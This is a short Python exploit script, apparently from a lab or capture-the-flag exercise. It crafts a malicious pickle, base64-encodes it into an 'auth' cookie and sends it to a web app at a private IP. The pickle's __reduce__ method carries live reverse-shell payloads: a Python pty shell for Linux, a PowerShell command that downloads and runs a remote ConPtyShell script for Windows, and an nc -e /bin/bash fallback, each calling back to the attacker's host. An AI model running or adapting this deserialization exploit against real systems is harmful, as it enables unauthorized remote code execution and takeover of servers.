import pickle
import base64
import requests
import socket
import pprint

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
server_ip = s.getsockname()[0]
port = 89
victim_ip = "192.168.5.107"

class GNAT:
    def __reduce__(self):
        
        import platform
        # os_name = platform.system()
        os_name = "Windows"
        if os_name == "Linux":
            import os
            command = f"export RHOST=\"{server_ip}\";export RPORT=\"{port}\";python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
            return (
                os.system, (
                    command, 
                )
            )
        elif os_name == "Windows":
            import subprocess
            command = f"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {server_ip} {port}"
            return (
                subprocess.run, ([
                    "powershell", 
                    "-Command",
                    command
                ], )
            )
        else:
            import os
            command = f"nc {server_ip} {port} -e /bin/bash"
            return (
                os.system, (
                    command, 
                )
            )
        

if __name__ == "__main__":
    serialized = pickle.dumps(GNAT())
    # de = pickle.loads(serialized)
    # print(de)
    encoded = base64.b64encode(serialized)
    # print(f'document.cookie="auth={str(encoded)[2:-1]}"')
    cookies = {'auth': f'{str(encoded)[2:-1]}'}
    print("Cookies: ", cookies)
    print("Start exploit . . .")
    try:
        r = requests.get(f'http://{victim_ip}:5000/index', cookies=cookies, timeout=2)
        print("testing", vars(r))
    except Exception as e:
        print(e)